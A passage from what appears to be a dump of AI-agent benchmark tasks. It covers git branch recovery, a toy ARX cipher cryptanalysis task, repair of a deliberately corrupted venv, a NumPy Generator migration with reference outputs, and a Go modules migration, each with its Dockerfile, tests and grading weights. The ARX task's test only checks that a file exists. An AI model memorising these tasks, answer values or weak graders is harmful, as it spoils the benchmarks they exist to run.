    """"""Test that the gRPC implementation files are present in the recovered branch.""""""
    # First ensure we're on the recovered branch
    subprocess.run(
        ['git', 'checkout', 'feature/payment-service-grpc'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    
    # Check for proto file
    assert os.path.exists('/workspace/proto/payment/payment.proto'), ""Proto file not found""
    
    # Check for service implementation
    assert os.path.exists('/workspace/services/payment/main.go'), ""Service implementation not found""
    
    # Check for tests
    assert os.path.exists('/workspace/services/payment/tests/integration_test.go'), ""Integration tests not found""
    
    # Verify proto file content
    with open('/workspace/proto/payment/payment.proto', 'r') as f:
        proto_content = f.read()
        assert 'service PaymentService' in proto_content, ""PaymentService not defined in proto""
        assert 'ProcessPayment' in proto_content, ""ProcessPayment RPC not defined""","{""test_branch_recovered"": 0.4, ""test_grpc_implementation_present"": 0.6}","{""setup_repo.sh"": ""#!/bin/bash\n\ncd /workspace\n\n# Initialize repo\ngit init\ngit config user.name \""Developer\""\ngit config user.email \""dev@example.com\""\n\n# Create initial structure\nmkdir -p proto/payment services/payment pkg/client\n\n# Create go.mod\ncat > go.mod << 'EOF'\nmodule github.com/company/microservices\n\ngo 1.21\n\nrequire (\n    google.golang.org/grpc v1.58.0\n    google.golang.org/protobuf v1.31.0\n)\nEOF\n\n# Create README\necho \""# Microservices Project\"" > README.md\n\n# Initial commit\ngit add .\ngit commit -m \""Initial project setup\""\n\n# Create the feature branch with gRPC implementation\ngit checkout -b feature/payment-service-grpc\n\n# Add proto file\nmkdir -p proto/payment\ncat > proto/payment/payment.proto << 'PROTOEOF'\nsyntax = \""proto3\"";\n\npackage payment;\n\noption go_package = \""github.com/company/microservices/pkg/client/payment\"";\n\nservice PaymentService {\n    rpc ProcessPayment(PaymentRequest) returns (PaymentResponse) {}\n    rpc GetPaymentStatus(PaymentStatusRequest) returns (PaymentStatusResponse) {}\n}\n\nmessage PaymentRequest {\n    string order_id = 1;\n    double amount = 2;\n    string currency = 3;\n    string payment_method = 4;\n}\n\nmessage PaymentResponse {\n    string transaction_id = 1;\n    bool success = 2;\n    string message = 3;\n}\n\nmessage PaymentStatusRequest {\n    string transaction_id = 1;\n}\n\nmessage PaymentStatusResponse {\n    string status = 1;\n    string updated_at = 2;\n}\nPROTOEOF\n\n# Add service implementation\nmkdir -p services/payment\ncat > services/payment/main.go << 'GOEOF'\npackage main\n\nimport (\n    \""context\""\n    \""log\""\n    \""net\""\n\n    \""google.golang.org/grpc\""\n    pb \""github.com/company/microservices/pkg/client/payment\""\n)\n\ntype server struct {\n    pb.UnimplementedPaymentServiceServer\n}\n\nfunc (s *server) ProcessPayment(ctx context.Context, req *pb.PaymentRequest) (*pb.PaymentResponse, error) {\n    // Implementation logic here\n    return &pb.PaymentResponse{\n        TransactionId: \""txn_\"" + req.OrderId,\n        Success:       true,\n        Message:       \""Payment processed successfully\"",\n    }, nil\n}\n\nfunc (s *server) GetPaymentStatus(ctx context.Context, req *pb.PaymentStatusRequest) (*pb.PaymentStatusResponse, error) {\n    return &pb.PaymentStatusResponse{\n        Status:    \""completed\"",\n        UpdatedAt: \""2025-01-15T10:00:00Z\"",\n    }, nil\n}\n\nfunc main() {\n    lis, err := net.Listen(\""tcp\"", \"":50051\"")\n    if err != nil {\n        log.Fatalf(\""failed to listen: %v\"", err)\n    }\n    s := grpc.NewServer()\n    pb.RegisterPaymentServiceServer(s, &server{})\n    log.Printf(\""gRPC server listening at %v\"", lis.Addr())\n    if err := s.Serve(lis); err != nil {\n        log.Fatalf(\""failed to serve: %v\"", err)\n    }\n}\nGOEOF\n\n# Add integration tests\nmkdir -p services/payment/tests\ncat > services/payment/tests/integration_test.go << 'TESTEOF'\npackage tests\n\nimport (\n    \""context\""\n    \""testing\""\n\n    \""google.golang.org/grpc\""\n    pb \""github.com/company/microservices/pkg/client/payment\""\n)\n\nfunc TestPaymentService(t *testing.T) {\n    conn, err := grpc.Dial(\""localhost:50051\"", grpc.WithInsecure())\n    if err != nil {\n        t.Fatalf(\""Failed to connect: %v\"", err)\n    }\n    defer conn.Close()\n\n    client := pb.NewPaymentServiceClient(conn)\n    \n    resp, err := client.ProcessPayment(context.Background(), &pb.PaymentRequest{\n        OrderId:       \""ORDER123\"",\n        Amount:        99.99,\n        Currency:      \""USD\"",\n        PaymentMethod: \""credit_card\"",\n    })\n    \n    if err != nil {\n        t.Fatalf(\""ProcessPayment failed: %v\"", err)\n    }\n    \n    if !resp.Success {\n        t.Errorf(\""Payment was not successful\"")\n    }\n}\nTESTEOF\n\n# Commit the feature work\ngit add .\ngit commit -m \""Add gRPC payment service implementation\""\n\n# Make another commit 3 days ago\nGIT_COMMITTER_DATE=\""3 days ago\"" git commit --amend --no-edit --date=\""3 days ago\""\n\n# Go back to main and delete the branch\ngit checkout main\ngit branch -D feature/payment-service-grpc\n\n# Make some other commits on main to advance the reflog\necho \""Some other feature\"" > feature.txt\ngit add feature.txt\ngit commit -m \""Add unrelated feature\""\n\necho \""Another change\"" >> README.md\ngit add README.md\ngit commit -m \""Update README\""""}",2025-07-22T11:54:07.525253+00:00,2025-07-22T11:54:07.555307+00:00
draft_dp_4559401e,medium,draft_dp_4559401e,security,The ARX cipher in arx_cipher.py has a rotational weakness. Need a cryptanalysis attack that recovers the last round key using rotational pairs. Must work with >80% success rate using <10k queries.,security,python|algorithms|encryption,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the cipher implementation and utilities
COPY arx_cipher.py /app/
COPY rotation_utils.py /app/

# Install numpy for statistical analysis
RUN pip install numpy","import os

def test_attack_solution_exists():
    """"""Test that attack.py is created with rotational cryptanalysis implementation.""""""
    # This will fail initially since attack.py doesn't exist
    assert os.path.exists('/app/attack.py'), ""attack.py file with rotational cryptanalysis attack must be created""","{""test_attack_solution_exists"": 1.0}","{""rotation_utils.py"": ""\""\""\""Utilities for rotational cryptanalysis of ARX ciphers.\""\""\""\n\ndef rotate_left(x, n, word_size=32):\n    \""\""\""Rotate x left by n bits.\""\""\""\n    mask = (1 << word_size) - 1\n    n = n % word_size\n    return ((x << n) | (x >> (word_size - n))) & mask\n\ndef rotate_right(x, n, word_size=32):\n    \""\""\""Rotate x right by n bits.\""\""\""\n    return rotate_left(x, word_size - n, word_size)\n\ndef generate_rotational_pair(x, rotation, word_size=32):\n    \""\""\""Generate a rotational pair (x, rot(x, r)).\""\""\""\n    return x, rotate_left(x, rotation, word_size)\n\ndef check_rotational_relation(a, b, rotation, word_size=32):\n    \""\""\""Check if b = rot(a, r) or a = rot(b, r).\""\""\""\n    return (rotate_left(a, rotation, word_size) == b or \n            rotate_left(b, rotation, word_size) == a)\n\ndef rotational_probability_add(rotation, word_size=32):\n    \""\""\""Calculate probability that rotational property holds through modular addition.\n    \n    For ARX ciphers, the rotational probability through addition depends on the\n    rotation amount and word size.\n    \""\""\""\n    # Simplified approximation for educational purposes\n    if rotation == 1:\n        return 0.5\n    elif rotation < word_size // 4:\n        return 0.25\n    else:\n        return 0.125\n\ndef analyze_output_correlation(outputs, rotation, word_size=32):\n    \""\""\""Analyze correlation between outputs for rotational pairs.\n    \n    Returns correlation score between 0 and 1.\n    \""\""\""\n    if not outputs:\n        return 0.0\n    \n    rotational_preserved = 0\n    total = len(outputs)\n    \n    for (out1, out2) in outputs:\n        # Check various rotations around the target\n        for r_offset in range(-2, 3):\n            test_rotation = (rotation + r_offset) % word_size\n            if check_rotational_relation(out1, out2, test_rotation, word_size):\n                rotational_preserved += 1\n                break\n    \n    return rotational_preserved / total\n\ndef generate_test_pairs(num_pairs, rotation=1, word_size=32):\n    \""\""\""Generate random rotational pairs for testing.\""\""\""\n    import random\n    pairs = []\n    \n    for _ in range(num_pairs):\n        x = random.randint(0, (1 << word_size) - 1)\n        x_rot = rotate_left(x, rotation, word_size)\n        pairs.append((x, x_rot))\n    \n    return pairs"", ""arx_cipher.py"": ""\""\""\""Simplified 4-round ARX cipher implementation for cryptanalysis testing.\""\""\""\n\nclass ARXCipher:\n    def __init__(self, round_keys=None):\n        self.word_size = 32\n        self.mask = (1 << self.word_size) - 1\n        \n        if round_keys is None:\n            # Default keys for testing\n            self.round_keys = [0xdeadbeef, 0xcafebabe, 0x87654321, 0x12345678]\n        else:\n            self.round_keys = round_keys\n    \n    def _add_mod(self, a, b):\n        \""\""\""Modular addition for 32-bit words.\""\""\""\n        return (a + b) & self.mask\n    \n    def _rotate_left(self, x, n):\n        \""\""\""Rotate x left by n bits.\""\""\""\n        n = n % self.word_size\n        return ((x << n) | (x >> (self.word_size - n))) & self.mask\n    \n    def _round_function(self, x, round_key):\n        \""\""\""Single round of ARX: Add, Rotate, XOR.\""\""\""\n        # Add round key\n        x = self._add_mod(x, round_key)\n        # Rotate left by 7 bits\n        x = self._rotate_left(x, 7)\n        # XOR with rotated version\n        x = x ^ self._rotate_left(x, 13)\n        return x\n    \n    def encrypt(self, plaintext):\n        \""\""\""Encrypt a single 32-bit word through 4 rounds.\""\""\""\n        state = plaintext & self.mask\n        \n        for i in range(4):\n            state = self._round_function(state, self.round_keys[i])\n        \n        return state\n    \n    def decrypt(self, ciphertext):\n        \""\""\""Decrypt a single 32-bit word (inverse of encrypt).\""\""\""\n        state = ciphertext & self.mask\n        \n        for i in range(3, -1, -1):\n            # Inverse of round function\n            # First undo the XOR\n            temp = state\n            for _ in range(10):  # Iterative inverse\n                temp = state ^ self._rotate_left(temp, 13)\n            state = temp\n            \n            # Undo rotation\n            state = self._rotate_left(state, self.word_size - 7)\n            \n            # Undo addition (subtract)\n            state = (state - self.round_keys[i]) & self.mask\n        \n        return state""}",2025-07-22T11:35:09.378976+00:00,2025-07-22T18:05:06.259523+00:00
draft_dp_c267c450,medium,draft_dp_c267c450,system-administration,The venv at /app/venv is corrupted after a failed upgrade. Need to repair it by extracting actually used packages from src/ imports and rebuild with only necessary deps. Keep editable installs from local-packages/ intact. Document fixes in venv-repair-report.txt.,system-administration,python|troubleshooting|package-management,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Use Python 3.11 from the base image instead of 3.9
RUN apt-get update && apt-get install -y python3.11-venv && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy project structure files
COPY src/ /app/src/
COPY tests/ /app/tests/
COPY local-packages/ /app/local-packages/
COPY requirements.txt /app/requirements.txt
COPY setup_corrupted_venv.py /app/setup_corrupted_venv.py

# Set up the corrupted venv
RUN python3.11 -m venv /app/venv && \
    /app/venv/bin/pip install --upgrade pip && \
    python3.11 /app/setup_corrupted_venv.py && \
    rm /app/setup_corrupted_venv.py

# Install pytest globally for testing
RUN pip install pytest

WORKDIR /app","import os
import subprocess
import sys

def test_venv_functional():
    """"""Test that the repaired venv exists and can run Python.""""""
    venv_python = ""/app/venv/bin/python""
    assert os.path.exists(venv_python), ""venv Python executable not found""
    
    result = subprocess.run([venv_python, ""-c"", ""import sys; print(sys.version)""], 
                          capture_output=True, text=True)
    assert result.returncode == 0, f""venv Python failed to run: {result.stderr}""
    assert ""3.11"" in result.stdout, ""venv is not using Python 3.11""

def test_required_imports_work():
    """"""Test that all imports from src/ files work in the repaired venv.""""""
    venv_python = ""/app/venv/bin/python""
    
    # Test imports from core.py
    test_imports = [
        ""import numpy"",
        ""import pandas"", 
        ""from sklearn.preprocessing import StandardScaler"",
        ""import requests"",
        ""from myutil import custom_helper""
    ]
    
    for imp in test_imports:
        cmd = f""import sys; sys.path.insert(0, '/app/src'); {imp}""
        result = subprocess.run([venv_python, ""-c"", cmd], 
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Import failed: {imp}\nError: {result.stderr}""
    
    # Test imports from utils.py
    util_imports = [""import json"", ""import yaml"", ""from dateutil import parser"", ""import click""]
    for imp in util_imports:
        result = subprocess.run([venv_python, ""-c"", imp], 
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Import failed: {imp}\nError: {result.stderr}""

def test_project_tests_pass():
    """"""Test that the project's test suite passes with the repaired venv.""""""
    venv_python = ""/app/venv/bin/python""
    
    # Run pytest using the venv
    result = subprocess.run([venv_python, ""-m"", ""pytest"", ""/app/tests/"", ""-v""], 
                          capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0, f""Project tests failed:\n{result.stdout}\n{result.stderr}""
    assert ""2 passed"" in result.stdout, ""Expected 2 tests to pass""

def test_repair_report_exists():
    """"""Test that the repair report was created with expected content.""""""
    report_path = ""/app/venv-repair-report.txt""
    assert os.path.exists(report_path), ""Repair report not found""
    
    with open(report_path, 'r') as f:
        content = f.read()
    
    # Report should contain information about what was fixed
    assert len(content) > 50, ""Report is too short""
    assert ""removed"" in content.lower() or ""uninstalled"" in content.lower(), \
           ""Report should mention removed packages""
    assert ""installed"" in content.lower() or ""added"" in content.lower(), \
           ""Report should mention installed packages""","{""test_venv_functional"": 0.2, ""test_required_imports_work"": 0.4, ""test_project_tests_pass"": 0.3, ""test_repair_report_exists"": 0.1}","{""requirements.txt"": ""numpy==1.24.0\npandas==1.5.0\nscikit-learn==1.2.0\nrequests==2.28.0\npyyaml==6.0\npython-dateutil==2.8.2\nclick==8.1.0\nmatplotlib==3.6.0\nscipy==1.9.0\npytest==7.2.0\nflask==2.2.0\nsqlalchemy==1.4.0"", ""setup_corrupted_venv.py"": ""#!/usr/bin/env python3.11\nimport os\nimport shutil\nimport subprocess\nimport random\n\nvenv_path = \""/app/venv\""\nsite_packages = os.path.join(venv_path, \""lib\"", \""python3.11\"", \""site-packages\"")\n\n# Install some packages first\nsubprocess.run([f\""{venv_path}/bin/pip\"", \""install\"", \""-r\"", \""/app/requirements.txt\""], \n               capture_output=True)\n\n# Install the local package in editable mode\nsubprocess.run([f\""{venv_path}/bin/pip\"", \""install\"", \""-e\"", \""/app/local-packages/\""], \n               capture_output=True)\n\n# Now corrupt the venv in various ways:\n\n# 1. Delete some .dist-info directories to break package metadata\nfor item in os.listdir(site_packages):\n    if item.endswith('.dist-info') and random.random() < 0.3:\n        shutil.rmtree(os.path.join(site_packages, item))\n\n# 2. Remove some actual package directories but leave their .dist-info\npackages_to_break = ['yaml', 'click']\nfor pkg in packages_to_break:\n    pkg_path = os.path.join(site_packages, pkg)\n    if os.path.exists(pkg_path):\n        shutil.rmtree(pkg_path)\n\n# 3. Corrupt scipy by removing key files\nscipy_path = os.path.join(site_packages, 'scipy')\nif os.path.exists(scipy_path):\n    for root, dirs, files in os.walk(scipy_path):\n        for file in files:\n            if file.endswith('.so') and random.random() < 0.5:\n                os.remove(os.path.join(root, file))\n\n# 4. Create version conflicts by manually editing metadata\nsklearn_dist = os.path.join(site_packages, 'scikit_learn-0.23.0.dist-info')\nif os.path.exists(sklearn_dist):\n    metadata_file = os.path.join(sklearn_dist, 'METADATA')\n    if os.path.exists(metadata_file):\n        with open(metadata_file, 'r') as f:\n            content = f.read()\n        content = content.replace('Requires-Dist: numpy (>=1.13.3)', \n                                 'Requires-Dist: numpy (>=1.22.0)')\n        with open(metadata_file, 'w') as f:\n            f.write(content)\n\nprint(\""Virtual environment corruption complete\"")"", ""local-packages/setup.py"": ""from setuptools import setup, find_packages\n\nsetup(\n    name=\""myutil\"",\n    version=\""0.1.0\"",\n    packages=find_packages(),\n    install_requires=[\n        \""matplotlib>=3.0.0\"",\n    ],\n)"", ""tests/test_utils.py"": ""import sys\nsys.path.insert(0, '/app/src')\n\nfrom myapp.utils import parse_date\nfrom datetime import datetime\n\ndef test_parse_date():\n    result = parse_date(\""2024-01-01\"")\n    assert isinstance(result, datetime)\n    assert result.year == 2024"", ""tests/test_core.py"": ""import sys\nsys.path.insert(0, '/app/src')\n\nfrom myapp.core import process_data\nimport numpy as np\n\ndef test_process_data():\n    test_data = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]\n    result = process_data(test_data)\n    assert isinstance(result, np.ndarray)\n    assert len(result) == 3"", ""local-packages/myutil/custom_helper.py"": ""import matplotlib.pyplot as plt\nimport numpy as np\n\ndef analyze():\n    data = np.random.randn(100, 3)\n    return data.tolist()"", ""local-packages/myutil/__init__.py"": ""from .custom_helper import analyze\n\n__all__ = ['analyze']"", ""src/myapp/__init__.py"": ""\""\""\""Main application package.\""\""\""\n__version__ = \""1.0.0\"""", ""src/myapp/core.py"": ""import numpy as np\nimport pandas as pd\nfrom sklearn.preprocessing import StandardScaler\nimport requests\nfrom myutil import custom_helper\n\ndef process_data(data):\n    df = pd.DataFrame(data)\n    scaler = StandardScaler()\n    normalized = scaler.fit_transform(df.values)\n    return np.mean(normalized, axis=0)\n\ndef fetch_external_data(url):\n    response = requests.get(url, timeout=10)\n    return response.json()\n\ndef run_analysis():\n    result = custom_helper.analyze()\n    return process_data(result)"", ""src/myapp/utils.py"": ""import json\nimport yaml\nfrom dateutil import parser\nimport click\n\ndef load_config(path):\n    with open(path) as f:\n        if path.endswith('.yaml'):\n            return yaml.safe_load(f)\n        return json.load(f)\n\ndef parse_date(date_str):\n    return parser.parse(date_str)\n\n@click.command()\n@click.option('--config', help='Config file path')\ndef cli(config):\n    data = load_config(config)\n    print(f\""Loaded config with {len(data)} entries\"")""}",2025-07-22T11:58:48.009460+00:00,2025-07-22T12:00:12.441650+00:00
draft_dp_d5a2bad1,medium,draft_dp_d5a2bad1,scientific-computing,"The monte_carlo.py script is throwing NumPy deprecation warnings and the results are slightly off. Need to update it to use the new random Generator API while keeping the exact same outputs for seeds 42, 123, and 999.",scientific-computing,python|numpy|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install current NumPy (will have legacy API with deprecation warnings)
RUN pip install numpy

# Copy application files
COPY monte_carlo.py /app/
COPY reference_results.json /app/

# Make script executable
RUN chmod +x monte_carlo.py","import subprocess
import json
import sys
import os
import warnings
import re

def test_uses_new_generator_api():
    """"""Test that the code has been updated to use the new NumPy Generator API.""""""
    # Read the monte_carlo.py file to check for new API usage
    with open('/app/monte_carlo.py', 'r') as f:
        code_content = f.read()
    
    # Check for patterns indicating new Generator API usage
    # Should find: np.random.default_rng() or similar
    # Should NOT find: np.random.seed() (legacy)
    
    has_generator = any([
        'default_rng' in code_content,
        'Generator' in code_content,
        'np.random.default_rng' in code_content,
        'RandomState' in code_content and 'legacy' not in code_content.lower()
    ])
    
    has_legacy_seed = 'np.random.seed(' in code_content
    
    # Also check for proper random method calls
    # New API: rng.standard_normal(), rng.uniform()
    # Old API: np.random.randn(), np.random.uniform()
    has_new_methods = any([
        'rng.standard_normal' in code_content,
        'rng.normal' in code_content,
        'rng.uniform' in code_content,
        'generator.standard_normal' in code_content,
        'generator.uniform' in code_content
    ])
    
    has_old_methods = any([
        'np.random.randn(' in code_content,
        'np.random.uniform(' in code_content
    ])
    
    assert has_generator, ""Code should use new NumPy Generator API (np.random.default_rng)""
    assert not has_legacy_seed, ""Code should not use legacy np.random.seed()""
    assert has_new_methods or not has_old_methods, ""Code should use new random methods (rng.* instead of np.random.*)""

def test_results_match_reference():
    """"""Test that results match reference values for all test seeds.""""""
    seeds = [42, 123, 999]
    
    # Load reference results
    with open('/app/reference_results.json', 'r') as f:
        reference = json.load(f)
    
    tolerance = 1e-10
    
    for seed in seeds:
        # Run the updated script
        result = subprocess.run(
            ['python', '/app/monte_carlo.py', str(seed)],
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0, f""Script should run successfully for seed {seed}""
        
        # Parse output
        try:
            output = json.loads(result.stdout)
        except json.JSONDecodeError:
            assert False, f""Output should be valid JSON for seed {seed}""
        
        # Check option price matches
        ref_price = reference[str(seed)]['option_price']
        actual_price = output['option_price']
        
        assert abs(ref_price - actual_price) < tolerance, \
            f""Option price for seed {seed} should match reference within {tolerance} tolerance""
        
        # Check uniform statistics match
        ref_mean = reference[str(seed)]['uniform_stats']['mean_uniform']
        ref_std = reference[str(seed)]['uniform_stats']['std_uniform']
        actual_mean = output['uniform_stats']['mean_uniform']
        actual_std = output['uniform_stats']['std_uniform']
        
        assert abs(ref_mean - actual_mean) < tolerance, \
            f""Uniform mean for seed {seed} should match reference within {tolerance} tolerance""
        assert abs(ref_std - actual_std) < tolerance, \
            f""Uniform std for seed {seed} should match reference within {tolerance} tolerance""","{""test_uses_new_generator_api"": 0.3, ""test_results_match_reference"": 0.7}","{""reference_results.json"": ""{\n  \""42\"": {\n    \""seed\"": 42,\n    \""option_price\"": 8.04875951103241,\n    \""uniform_stats\"": {\n      \""mean_uniform\"": 0.5194429235005713,\n      \""std_uniform\"": 0.28150354143943984\n    }\n  },\n  \""123\"": {\n    \""seed\"": 123,\n    \""option_price\"": 8.009866433698408,\n    \""uniform_stats\"": {\n      \""mean_uniform\"": 0.5476211158970079,\n      \""std_uniform\"": 0.3024441829075717\n    }\n  },\n  \""999\"": {\n    \""seed\"": 999,\n    \""option_price\"": 8.064854129608122,\n    \""uniform_stats\"": {\n      \""mean_uniform\"": 0.5010572204302836,\n      \""std_uniform\"": 0.28872372130109236\n    }\n  }\n}"", ""monte_carlo.py"": ""#!/usr/bin/env python3\nimport numpy as np\nimport json\nimport sys\n\ndef black_scholes_monte_carlo(S0, K, T, r, sigma, n_simulations, seed):\n    \""\""\""\n    Monte Carlo simulation for European call option pricing using Black-Scholes model.\n    \n    Parameters:\n    S0: Initial stock price\n    K: Strike price\n    T: Time to maturity (years)\n    r: Risk-free rate\n    sigma: Volatility\n    n_simulations: Number of Monte Carlo paths\n    seed: Random seed for reproducibility\n    \""\""\""\n    # Set random seed using legacy API\n    np.random.seed(seed)\n    \n    # Generate random price paths using legacy API\n    dt = T / 252  # Daily steps\n    n_steps = int(T * 252)\n    \n    # Random walks using legacy random functions\n    Z = np.random.randn(n_simulations, n_steps)\n    \n    # Price paths\n    drift = (r - 0.5 * sigma**2) * dt\n    diffusion = sigma * np.sqrt(dt) * Z\n    \n    S = np.zeros((n_simulations, n_steps + 1))\n    S[:, 0] = S0\n    \n    for t in range(1, n_steps + 1):\n        S[:, t] = S[:, t-1] * np.exp(drift + diffusion[:, t-1])\n    \n    # Calculate option payoff\n    payoffs = np.maximum(S[:, -1] - K, 0)\n    \n    # Discounted expected payoff\n    option_price = np.exp(-r * T) * np.mean(payoffs)\n    \n    # Additional statistics using legacy API\n    random_vals = np.random.uniform(0, 1, 100)\n    stats = {\n        'mean_uniform': float(np.mean(random_vals)),\n        'std_uniform': float(np.std(random_vals))\n    }\n    \n    return option_price, stats\n\ndef run_simulations(seed):\n    \""\""\""Run a set of simulations with given seed.\""\""\""\n    # Parameters for option pricing\n    S0 = 100  # Initial stock price\n    K = 105   # Strike price\n    T = 1.0   # 1 year to maturity\n    r = 0.05  # Risk-free rate 5%\n    sigma = 0.2  # Volatility 20%\n    n_simulations = 100000\n    \n    option_price, stats = black_scholes_monte_carlo(S0, K, T, r, sigma, n_simulations, seed)\n    \n    return {\n        'seed': seed,\n        'option_price': float(option_price),\n        'uniform_stats': stats\n    }\n\ndef main():\n    if len(sys.argv) < 2:\n        print(\""Usage: python monte_carlo.py <seed>\"")\n        sys.exit(1)\n    \n    seed = int(sys.argv[1])\n    result = run_simulations(seed)\n    \n    print(json.dumps(result, indent=2))\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-22T11:56:56.175617+00:00,2025-07-22T12:00:06.771754+00:00
draft_dp_a4ec3713,hard,draft_dp_a4ec3713,software-engineering,The microservice won't build after upgrading to Go 1.18. Need to migrate from GOPATH/vendor to modules and fix the dependency conflicts - grpc and protobuf versions are clashing.,software-engineering,compiler-migration|debugging|build-automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Go 1.18
RUN apt-get update && apt-get install -y wget && \
    wget https://go.dev/dl/go1.18.10.linux-amd64.tar.gz && \
    tar -C /usr/local -xzf go1.18.10.linux-amd64.tar.gz && \
    rm go1.18.10.linux-amd64.tar.gz

ENV PATH=/usr/local/go/bin:$PATH
ENV GOPATH=/go
ENV GO111MODULE=off

# Create legacy GOPATH structure
RUN mkdir -p /go/src/github.com/company/service

WORKDIR /go/src/github.com/company/service

# Copy the legacy project files
COPY main.go /go/src/github.com/company/service/
COPY server.go /go/src/github.com/company/service/
COPY handler.go /go/src/github.com/company/service/
COPY service_test.go /go/src/github.com/company/service/
COPY proto/ /go/src/github.com/company/service/proto/
COPY vendor/ /go/src/github.com/company/service/vendor/

# Try to build (this will fail due to Go 1.18 and dependency issues)
RUN go build . || true","import os
import subprocess
import json

def test_go_mod_created_and_valid():
    """"""Test that go.mod file exists and contains proper module declaration""""""
    # Check go.mod exists
    assert os.path.exists('/go/src/github.com/company/service/go.mod'), ""go.mod file not created""
    
    # Verify go.mod content
    with open('/go/src/github.com/company/service/go.mod', 'r') as f:
        content = f.read()
        assert 'module github.com/company/service' in content, ""Module declaration missing""
        assert 'go 1.18' in content, ""Go version not specified""
        # Check for key dependencies
        assert 'google.golang.org/grpc' in content, ""gRPC dependency missing""
        assert 'google.golang.org/protobuf' in content or 'github.com/golang/protobuf' in content, ""Protobuf dependency missing""

def test_service_builds_and_tests_pass():
    """"""Test that the service builds successfully and all tests pass""""""
    # Change to project directory
    os.chdir('/go/src/github.com/company/service')
    
    # Set GO111MODULE=on for module mode
    env = os.environ.copy()
    env['GO111MODULE'] = 'on'
    
    # Run go build
    result = subprocess.run(['go', 'build', '.'], capture_output=True, text=True, env=env)
    assert result.returncode == 0, f""Build failed: {result.stderr}""
    
    # Check binary exists
    assert os.path.exists('/go/src/github.com/company/service/service'), ""Binary not created""
    
    # Run tests
    result = subprocess.run(['go', 'test', './...'], capture_output=True, text=True, env=env)
    assert result.returncode == 0, f""Tests failed: {result.stderr}""
    assert 'PASS' in result.stdout, ""Tests did not pass""","{""test_go_mod_created_and_valid"": 0.4, ""test_service_builds_and_tests_pass"": 0.6}","{""handler.go"": ""package main\n\nimport (\n\t\""context\""\n\t\""time\""\n\n\t\""github.com/golang/protobuf/ptypes\""\n\tpb \""github.com/company/service/proto\""\n)\n\nfunc (s *server) ProcessData(ctx context.Context, req *pb.DataRequest) (*pb.DataResponse, error) {\n\ttimestamp := ptypes.TimestampNow()\n\t\n\tprocessed := len(req.Data) * 2\n\t\n\treturn &pb.DataResponse{\n\t\tProcessedCount: int32(processed),\n\t\tTimestamp: timestamp,\n\t}, nil\n}"", ""server.go"": ""package main\n\nimport (\n\t\""context\""\n\t\n\tpb \""github.com/company/service/proto\""\n)\n\ntype server struct {\n\tpb.UnimplementedServiceServer\n}\n\nfunc (s *server) GetStatus(ctx context.Context, req *pb.StatusRequest) (*pb.StatusResponse, error) {\n\treturn &pb.StatusResponse{\n\t\tStatus: \""running\"",\n\t\tVersion: \""1.0.0\"",\n\t}, nil\n}"", ""service_test.go"": ""package main\n\nimport (\n\t\""context\""\n\t\""testing\""\n\n\tpb \""github.com/company/service/proto\""\n)\n\nfunc TestGetStatus(t *testing.T) {\n\ts := &server{}\n\treq := &pb.StatusRequest{}\n\t\n\tresp, err := s.GetStatus(context.Background(), req)\n\tif err != nil {\n\t\tt.Fatalf(\""GetStatus failed: %v\"", err)\n\t}\n\t\n\tif resp.Status != \""running\"" {\n\t\tt.Errorf(\""expected status 'running', got %s\"", resp.Status)\n\t}\n}\n\nfunc TestProcessData(t *testing.T) {\n\ts := &server{}\n\treq := &pb.DataRequest{\n\t\tData: []byte(\""test data\""),\n\t}\n\t\n\tresp, err := s.ProcessData(context.Background(), req)\n\tif err != nil {\n\t\tt.Fatalf(\""ProcessData failed: %v\"", err)\n\t}\n\t\n\tif resp.ProcessedCount != 18 {\n\t\tt.Errorf(\""expected processed count 18, got %d\"", resp.ProcessedCount)\n\t}\n}"", ""main.go"": ""package main\n\nimport (\n\t\""log\""\n\t\""net\""\n\n\t\""google.golang.org/grpc\""\n\tpb \""github.com/company/service/proto\""\n)\n\nfunc main() {\n\tlis, err := net.Listen(\""tcp\"", \"":8080\"")\n\tif err != nil {\n\t\tlog.Fatalf(\""failed to listen: %v\"", err)\n\t}\n\n\ts := grpc.NewServer()\n\tpb.RegisterServiceServer(s, &server{})\n\n\tlog.Println(\""Starting gRPC server on :8080\"")\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\""failed to serve: %v\"", err)\n\t}\n}"", ""proto/service.proto"": ""syntax = \""proto3\"";\n\npackage proto;\n\noption go_package = \""github.com/company/service/proto\"";\n\nimport \""google/protobuf/timestamp.proto\"";\n\nservice Service {\n    rpc GetStatus(StatusRequest) returns (StatusResponse) {}\n    rpc ProcessData(DataRequest) returns (DataResponse) {}\n}\n\nmessage StatusRequest {}\n\nmessage StatusResponse {\n    string status = 1;\n    string version = 2;\n}\n\nmessage DataRequest {\n    bytes data = 1;\n}\n\nmessage DataResponse {\n    int32 processed_count = 1;\n    google.protobuf.Timestamp timestamp = 2;\n}"", ""proto/service.pb.go"": ""// Code generated by protoc-gen-go. DO NOT EDIT.\n// source: proto/service.proto\n\npackage proto\n\nimport (\n\tcontext \""context\""\n\tfmt \""fmt\""\n\tproto \""github.com/golang/protobuf/proto\""\n\ttimestamp \""github.com/golang/protobuf/ptypes/timestamp\""\n\tgrpc \""google.golang.org/grpc\""\n\tcodes \""google.golang.org/grpc/codes\""\n\tstatus \""google.golang.org/grpc/status\""\n\tmath \""math\""\n)\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ = proto.Marshal\nvar _ = fmt.Errorf\nvar _ = math.Inf\n\nconst _ = proto.ProtoPackageIsVersion3\n\ntype StatusRequest struct {\n\tXXX_NoUnkeyedLiteral struct{} `json:\""-\""`\n\tXXX_unrecognized     []byte   `json:\""-\""`\n\tXXX_sizecache        int32    `json:\""-\""`\n}\n\nfunc (m *StatusRequest) Reset()         { *m = StatusRequest{} }\nfunc (m *StatusRequest) String() string { return proto.CompactTextString(m) }\nfunc (*StatusRequest) ProtoMessage()    {}\n\ntype StatusResponse struct {\n\tStatus               